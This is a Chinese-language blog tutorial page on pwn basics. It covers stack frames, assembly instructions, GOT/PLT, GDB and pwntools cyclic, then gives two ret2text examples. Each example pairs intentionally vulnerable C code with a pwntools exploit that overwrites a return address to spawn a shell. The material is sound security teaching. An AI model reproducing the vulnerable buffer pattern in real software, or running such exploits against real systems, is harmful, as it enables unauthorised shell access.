@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>PWN基础知识</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/gh/tonsky/FiraCode@2/distr/fira_code.css" rel="stylesheet">
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/03/20/Ret2Text%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/03/20/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/&title=PWN基础知识" target="_blank" rel="noopener"><i class="fab fa-qq " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/03/20/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/&title=PWN基础知识" target="_blank" rel="noopener"><i class="fab fa-weibo " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/20/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/&text=PWN基础知识" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PWN基础知识&body=Check out this article: http://yoursite.com/2020/03/20/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-栈帧的概念"><span class="toc-number">1.</span> <span class="toc-text">0x 01 栈帧的概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-相关汇编指令"><span class="toc-number">2.</span> <span class="toc-text">0x 02 相关汇编指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-相关寄存器"><span class="toc-number">3.</span> <span class="toc-text">0x 03 相关寄存器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-04-GOT表和PLT表"><span class="toc-number">4.</span> <span class="toc-text">0x 04 GOT表和PLT表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-05-64位汇编参数传递"><span class="toc-number">5.</span> <span class="toc-text">0x 05 64位汇编参数传递</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-06-内存对齐"><span class="toc-number">6.</span> <span class="toc-text">0x 06 内存对齐</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-07-GDB调试命令"><span class="toc-number">7.</span> <span class="toc-text">0x 07 GDB调试命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-08-cyclic工具"><span class="toc-number">8.</span> <span class="toc-text">0x 08 cyclic工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-09-简单实例"><span class="toc-number">9.</span> <span class="toc-text">0x 09 简单实例</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        PWN基础知识
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-03-20T05:35:27.000Z" itemprop="datePublished">2020-03-20</time>
+        
+        (Updated: <time datetime="2020-03-20T02:03:19.135Z" itemprop="dateModified">2020-03-20</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/pwn%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">pwn基础知识</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="0x-01-栈帧的概念"><a href="#0x-01-栈帧的概念" class="headerlink" title="0x 01 栈帧的概念"></a>0x 01 栈帧的概念</h3><blockquote>
+<p>从逻辑上讲，栈帧就是一个函数执行的环境：函数调用框架、函数参数、函数的局部变量、函数执行完后返回到哪里等等。栈是从高地址向低地址延伸的。每个函数的每次调用，都有它自己独立的一个栈帧，这个栈帧中维持着所需要的各种信息。</p>
+<p>寄存器ebp指向当前的栈帧的底部（高地址），寄存器esp指向当前的栈帧的顶部（低地址）。</p>
+</blockquote>
+<p><img src="https://images2015.cnblogs.com/blog/1069650/201704/1069650-20170427115241365-545987088.png" alt="img"></p>
+<p>注意：ebp指向当前位于系统栈最上边一个栈帧的底部，而不是系统栈的底部。严格说来，“栈帧底部”和“栈底”是不同的概念;ESP所指的栈帧顶部和系统栈的顶部是同一个位置。**</p>
+<p>参考链接：<a href="https://www.cnblogs.com/33debug/p/6773059.html" target="_blank" rel="noopener">函数的调用过程（栈帧）</a></p>
+<h3 id="0x-02-相关汇编指令"><a href="#0x-02-相关汇编指令" class="headerlink" title="0x 02 相关汇编指令"></a>0x 02 相关汇编指令</h3><p>关于dword ptr 指令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dword   双字 就是四个字节</span><br><span class="line">ptr     pointer缩写 即指针</span><br><span class="line">[]里的数据是一个地址值，这个地址指向一个双字型数据</span><br><span class="line">比如mov eax, dword ptr [12345678]  把内存地址12345678中的双字型（32位）数据赋给eax</span><br></pre></td></tr></table></figure>
+
+<p>关于CALL，RET和LEAVE指令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CALL指令的步骤：首先是将返回地址（也就是call指令要执行时EIP的值）压入栈顶，然后是将程序跳转到当前调用的方法的起始地址。执行push和jump指令。</span><br><span class="line"></span><br><span class="line">RET指令则是将栈顶的返回地址弹出到EIP，然后按照EIP此时指示的指令地址继续执行程序。</span><br><span class="line"></span><br><span class="line">LEAVE指令是将栈指针指向帧指针，然后POP备份的原帧指针到%EBP。（恢复到调用的时候ebp和esp值）</span><br><span class="line"></span><br><span class="line">Leave等价于：</span><br><span class="line">movl %ebp %esp</span><br><span class="line">popl %ebp</span><br></pre></td></tr></table></figure>
+
+<p>push   ebp //压入返回地址</p>
+<p>lea指令 复制内存地址</p>
+<h3 id="0x-03-相关寄存器"><a href="#0x-03-相关寄存器" class="headerlink" title="0x 03 相关寄存器"></a>0x 03 相关寄存器</h3><p>eip寄存器：用来存储CPU要读取指令的地址,CPU通过<em>EIP寄存器</em>读取即将要执行的指令。</p>
+<h3 id="0x-04-GOT表和PLT表"><a href="#0x-04-GOT表和PLT表" class="headerlink" title="0x 04 GOT表和PLT表"></a>0x 04 GOT表和PLT表</h3><p>为了更好的用户体验和内存<em>C*</em>P<strong>U<em>的利用率，程序编译时会采用两种表进行辅助，一个为</em>P</strong>L<strong>T<em>表，一个为</em>G</strong>O<strong>T<em>表，</em>P</strong>L<strong>T<em>表可以称为内部函数表，</em>G</strong>O<strong>T<em>表为全局函数表（也可以说是动态函数表这是个人自称），这两个表是相对应的，什么叫做相对应呢，</em>P</strong>L<strong>T<em>表中的数据就是</em>G</strong>O*<em>T</em>表中的一个地址，可以理解为一定是一一对应的，如下图：</p>
+<p><img src="https://img-blog.csdn.net/20170123151558845?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMTg2NjEyNTc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="img"></p>
+<h3 id="0x-05-64位汇编参数传递"><a href="#0x-05-64位汇编参数传递" class="headerlink" title="0x 05 64位汇编参数传递"></a>0x 05 64位汇编参数传递</h3><p><img src="https://bbs.pediy.com/upload/attach/201902/827130_P7PCJ24ZK3TVPMA.png" alt="img"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</span><br><span class="line"></span><br><span class="line">参数个数大于 7 个的时候</span><br><span class="line">H(a, b, c, d, e, f, g, h);</span><br><span class="line">a-&gt;%rdi, b-&gt;%rsi, c-&gt;%rdx, d-&gt;%rcx, e-&gt;%r8, f-&gt;%r9</span><br><span class="line">h-&gt;8(%esp)</span><br><span class="line">g-&gt;(%esp)</span><br><span class="line">call H</span><br><span class="line"></span><br><span class="line">write函数需要三个参数，需要rdi，rsi，rdx三个寄存器</span><br><span class="line">http:&#x2F;&#x2F;abcdxyzk.github.io&#x2F;blog&#x2F;2012&#x2F;11&#x2F;23&#x2F;assembly-args&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x-06-内存对齐"><a href="#0x-06-内存对齐" class="headerlink" title="0x 06 内存对齐"></a>0x 06 内存对齐</h3><p><img src="/2020/03/20/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20200119204051236.png" alt="image-20200119204051236"></p>
+<ul>
+<li>作用：减少CPU访问内存的次数</li>
+<li>原因：</li>
+</ul>
+<p>1.平台原因(移植原因)：不是所有的硬件平台都能访问任意地址上的任意数据的；某些硬件平台只能在某些地址处取某些特定类型的数据，否则抛出硬件异常。<br>2.性能原因：数据结构(尤其是栈)应该尽可能地在自然边界上对齐。原因在于，为了访问未对齐的内存，处理器需要作两次内存访问；而对齐的内存访问仅需要一次访问。<br>参考资料： <a href="https://mp.weixin.qq.com/s?src=11&timestamp=1579437525&ver=2106&signature=nR5axh9kvfbbOyiJz7Xog*tdwlSkaLY5ecX7Rztxmt3AeBlxmpC2vgKCji6l6OBEoiKvO9K8Pscd27wxWv0oMZYrdmMCWYDIf6qsc*g2QAQ*n-XZqB*bgtAw2SKh28zs&new=1" target="_blank" rel="noopener">【底层原理】C/C++内存对齐详解</a>       </p>
+<h3 id="0x-07-GDB调试命令"><a href="#0x-07-GDB调试命令" class="headerlink" title="0x 07 GDB调试命令"></a>0x 07 GDB调试命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">（gdb）help：查看命令帮助，具体命令查询在gdb中输入help + 命令,简写h</span><br><span class="line"></span><br><span class="line">（gdb）run：重新开始运行文件（run-text：加载文本文件，run-bin：加载二进制文件）,简写r</span><br><span class="line"></span><br><span class="line">（gdb）start：单步执行，运行程序，停在第一执行语句</span><br><span class="line"></span><br><span class="line">（gdb）list：查看原代码（list-n,从第n行开始查看代码。list+ 函数名：查看具体函数）,简写l</span><br><span class="line"></span><br><span class="line">（gdb）set：设置变量的值</span><br><span class="line"></span><br><span class="line">（gdb）next：单步调试（逐过程，函数直接执行）,简写n</span><br><span class="line"></span><br><span class="line">（gdb）step：单步调试（逐语句：跳入自定义函数内部执行）,简写s</span><br><span class="line"></span><br><span class="line">（gdb）backtrace：查看函数的调用的栈帧和层级关系,简写bt</span><br><span class="line"></span><br><span class="line">（gdb）frame：切换函数的栈帧,简写f</span><br><span class="line"></span><br><span class="line">（gdb）info：查看函数内部局部变量的数值,简写i</span><br><span class="line"></span><br><span class="line">（gdb）finish：结束当前函数，返回到函数调用点</span><br><span class="line"></span><br><span class="line">（gdb）continue：继续运行,简写c</span><br><span class="line"></span><br><span class="line">（gdb）print：打印值及地址,简写p</span><br><span class="line"></span><br><span class="line">（gdb）quit：退出gdb,简写q</span><br><span class="line"></span><br><span class="line">（gdb）break+num：在第num行设置断点,简写b</span><br><span class="line"></span><br><span class="line">（gdb）info breakpoints：查看当前设置的所有断点</span><br><span class="line"></span><br><span class="line">（gdb）delete breakpoints num：删除第num个断点,简写d</span><br><span class="line"></span><br><span class="line">（gdb）display：追踪查看具体变量值</span><br><span class="line"></span><br><span class="line">（gdb）undisplay：取消追踪观察变量</span><br><span class="line"></span><br><span class="line">（gdb）watch：被设置观察点的变量发生修改时，打印显示</span><br><span class="line"></span><br><span class="line">（gdb）i watch：显示观察点</span><br><span class="line"></span><br><span class="line">（gdb）enable breakpoints：启用断点</span><br><span class="line"></span><br><span class="line">（gdb）disable breakpoints：禁用断点</span><br><span class="line"></span><br><span class="line">（gdb）x：查看指定内存地址内容  x&#x2F;20xw 显示20个单元，16进制，4字节每单元</span><br><span class="line"> https:&#x2F;&#x2F;www.cnblogs.com&#x2F;redman274&#x2F;p&#x2F;12164753.html</span><br><span class="line"> 如果地址所指的是字符串，那么格式可以是s，如果地址是指令地址，那么格式可以是i</span><br><span class="line"> </span><br><span class="line">（gdb）run argv[1] argv[2]：调试时命令行传参</span><br><span class="line"></span><br><span class="line">（gdb）set follow-fork-mode child#Makefile项目管理：选择跟踪父子进程（fork()）</span><br><span class="line"></span><br><span class="line">gdb 中step next 与finish的区别</span><br><span class="line">step 就是单步执行，遇到子函数就进入并且继续单步执行；在其他调试其中相当于step-into命令，作用是移动到下一个可执行的代码行。如果当前行是一个函数调用，则调试器进入函数并停止在函数体的第一行。step可以帮助初步揭开代码位置的谜团，例如：函数调用和函数本身可能在不同的文件中。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">next 是在单步执行时，在函数内遇到子函数时不会进入子函数内单步执行，而是将子函数整个执行完再停止，也就是把子函数整个作为一步。在其他调试器中相当于step-over，作用是在同一个调用栈层中移动到下一个可执行的代码行。调试器不会进入函数体。如果当前行是函数的最后一行，则，next将进入下一个栈层，并在调用函数的下一行停止。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">finish就是但单步执行到子函数内时，用step out就可以执行完子函数余下部分，并返回到上一层函数。在其他调试器中相当于step-out，作用是在栈中前进到到下一层，并在调用函数的下一行停止。</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x-08-cyclic工具"><a href="#0x-08-cyclic工具" class="headerlink" title="0x 08 cyclic工具"></a>0x 08 cyclic工具</h3><p>使用pwntools里面的cyclic工具生成字符串和计算偏移</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@hw-virtual-machine:&#x2F;home&#x2F;hw&#x2F;桌面&#x2F;PWN# cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line"></span><br><span class="line">root@hw-virtual-machine:&#x2F;home&#x2F;hw&#x2F;桌面&#x2F;PWN# cyclic -l 0x62616164</span><br><span class="line">112</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x-09-简单实例"><a href="#0x-09-简单实例" class="headerlink" title="0x 09 简单实例"></a>0x 09 简单实例</h3><p>源代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void exploit()</span><br><span class="line">&#123;</span><br><span class="line">    system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void func()</span><br><span class="line">&#123;</span><br><span class="line">    char str[0x20];</span><br><span class="line">    read(0, str, 0x50);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    func();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>func函数汇编</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function func:</span><br><span class="line">   0x080484b4 &lt;+0&gt;:	push   ebp</span><br><span class="line">   0x080484b5 &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">   0x080484b7 &lt;+3&gt;:	sub    esp,0x38</span><br><span class="line">   0x080484ba &lt;+6&gt;:	mov    eax,gs:0x14</span><br><span class="line">   0x080484c0 &lt;+12&gt;:	mov    DWORD PTR [ebp-0xc],eax</span><br><span class="line">   0x080484c3 &lt;+15&gt;:	xor    eax,eax</span><br><span class="line">   0x080484c5 &lt;+17&gt;:	sub    esp,0x4</span><br><span class="line">   0x080484c8 &lt;+20&gt;:	push   0x50   &#x2F;&#x2F;压入read函数的第三个参数</span><br><span class="line">   0x080484ca &lt;+22&gt;:	lea    eax,[ebp-0x2c]   </span><br><span class="line">   0x080484cd &lt;+25&gt;:	push   eax    &#x2F;&#x2F;压入read函数的第二个参数</span><br><span class="line">   0x080484ce &lt;+26&gt;:	push   0x0    &#x2F;&#x2F;压入read函数的第一个参数</span><br><span class="line">   0x080484d0 &lt;+28&gt;:	call   0x8048350 &lt;read@plt&gt;    &#x2F;&#x2F;调用plt表的</span><br><span class="line">   0x080484d5 &lt;+33&gt;:	add    esp,0x10</span><br><span class="line">   0x080484d8 &lt;+36&gt;:	nop</span><br><span class="line">   0x080484d9 &lt;+37&gt;:	mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x080484dc &lt;+40&gt;:	xor    eax,DWORD PTR gs:0x14</span><br><span class="line">   0x080484e3 &lt;+47&gt;:	je     0x80484ea &lt;func+54&gt;</span><br><span class="line">   0x080484e5 &lt;+49&gt;:	call   0x8048360 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x080484ea &lt;+54&gt;:	leave  </span><br><span class="line">   0x080484eb &lt;+55&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+
+<p>exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">p &#x3D; process(&quot;.&#x2F;pwn1&quot;)</span><br><span class="line"></span><br><span class="line">offset &#x3D; 0x2c + 0x4</span><br><span class="line">payload &#x3D; &#39;a&#39;*offset + p32(0x0804849b)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>实例二：</p>
+<p><img src="/2020/03/20/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20200117223344225.png" alt></p>
+<p><img src="/2020/03/20/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20200117223446581.png" alt></p>
+<p>汇编代码：</p>
+<p>main函数中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040078c &lt;+145&gt;:	lea    rax,[rbp-0x4]</span><br><span class="line">   0x0000000000400790 &lt;+149&gt;:	mov    rsi,rax</span><br><span class="line">   0x0000000000400793 &lt;+152&gt;:	mov    edi,0x400961</span><br><span class="line">   0x0000000000400798 &lt;+157&gt;:	mov    eax,0x0</span><br><span class="line">   0x000000000040079d &lt;+162&gt;:	call   0x4005d0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x00000000004007a2 &lt;+167&gt;:	mov    edi,0x400964</span><br><span class="line">   0x00000000004007a7 &lt;+172&gt;:	call   0x400580 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000004007ac &lt;+177&gt;:	mov    edx,DWORD PTR [rbp-0x4]   &#x2F;&#x2F;传入第三个参数值给edx</span><br><span class="line">   0x00000000004007af &lt;+180&gt;:	lea    rax,[rbp-0x10]</span><br><span class="line">   0x00000000004007b3 &lt;+184&gt;:	mov    rsi,rax    &#x2F;&#x2F;传入第二个参数值给rsi</span><br><span class="line">   0x00000000004007b6 &lt;+187&gt;:	mov    edi,0x0    &#x2F;&#x2F;传入第一个参数值给edi</span><br><span class="line">   0x00000000004007bb &lt;+192&gt;:	mov    eax,0x0</span><br><span class="line">   0x00000000004007c0 &lt;+197&gt;:	call   0x4005a0 &lt;read@plt&gt;</span><br><span class="line">   0x00000000004007c5 &lt;+202&gt;:	mov    eax,0x0</span><br><span class="line">   0x00000000004007ca &lt;+207&gt;:	leave  </span><br><span class="line">   0x00000000004007cb &lt;+208&gt;:	ret</span><br></pre></td></tr></table></figure>
+
+<p>exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">if args[&#39;REMOTE&#39;]:</span><br><span class="line">    sh &#x3D; remote(sys.argv[1], sys.argv[2])</span><br><span class="line">else:</span><br><span class="line">    sh &#x3D; process(&quot;.&#x2F;ret2text&quot;)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&quot;name:\n&quot;,str(50))</span><br><span class="line"></span><br><span class="line">payload&#x3D;&quot;a&quot;*0x18 + p64(0x0000000004006E6)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;name?\n&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">print(sh.recv())</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-栈帧的概念"><span class="toc-number">1.</span> <span class="toc-text">0x 01 栈帧的概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-相关汇编指令"><span class="toc-number">2.</span> <span class="toc-text">0x 02 相关汇编指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-相关寄存器"><span class="toc-number">3.</span> <span class="toc-text">0x 03 相关寄存器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-04-GOT表和PLT表"><span class="toc-number">4.</span> <span class="toc-text">0x 04 GOT表和PLT表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-05-64位汇编参数传递"><span class="toc-number">5.</span> <span class="toc-text">0x 05 64位汇编参数传递</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-06-内存对齐"><span class="toc-number">6.</span> <span class="toc-text">0x 06 内存对齐</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-07-GDB调试命令"><span class="toc-number">7.</span> <span class="toc-text">0x 07 GDB调试命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-08-cyclic工具"><span class="toc-number">8.</span> <span class="toc-text">0x 08 cyclic工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-09-简单实例"><span class="toc-number">9.</span> <span class="toc-text">0x 09 简单实例</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
